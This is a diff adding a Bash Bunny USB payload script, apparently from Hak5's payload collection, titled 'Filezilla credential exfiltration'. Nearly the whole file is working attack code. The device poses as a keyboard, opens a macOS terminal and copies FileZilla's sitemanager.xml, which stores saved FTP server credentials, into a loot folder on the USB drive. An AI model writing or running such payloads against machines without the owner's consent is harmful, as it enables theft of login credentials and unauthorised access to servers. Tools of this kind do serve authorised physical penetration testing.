@@ -1,0 +1,50 @@
+###############################################################################
+#           _____  _____  _____  _____     _____  _____  _____  _____  __ __  #
+# (\___/)  | __  ||  _  ||   __||  |  |   | __  ||  |  ||   | ||   | ||  |  | #
+# (='.'=)  | __ -||     ||__   ||     |   | __ -||  |  || | | || | | ||_   _| #
+# (")_(")  |_____||__|__||_____||__|__|   |_____||_____||_|___||_|___|  |_|   #  
+#                           Bash Bunny by Hak5 USB Attack/Automation Platform #
+#                                                                             #
+###############################################################################
+#                                                                             #
+# Title:         Filezilla credential exfiltration                            #
+# Author:        Quentin Lamamy <contact@quentin-lamamy.fr>                   #
+# Description    Exfiltrate filezilla credential                              #
+# Version:       1.0                                                          #
+#                                                                             #
+###############################################################################
+
+#!/bin/bash
+
+LED SETUP
+lootdir=/Volumes/BashBunny/loot/exfiltration
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+
+# Get a terminal
+QUACK CTRL SPACE
+QUACK STRING terminal
+QUACK ENTER
+
+# Move to filezilla folder
+QUACK STRING cd .filezilla
+QUACK ENTER
+
+# Create lootdir
+QUACK STRING mkdir $lootdir
+QUACK ENTER
+
+# Copy the sitemanager file
+QUACK STRING cp sitemanager.xml $lootdir/sitemanager.xml
+QUACK ENTER
+
+# Close terminal
+QUACK GUI W
+
+LED FINISH
+#################################################################################
+# (\___/)      Find further documentation, repository of payloads,      (\___/) #
+# (='.'=)      tutorial videos and community support forums at          (='.'=) #
+# (")_(")      bashbunny.com. (C) Hak5 LLC                              (")_(") #
+#################################################################################
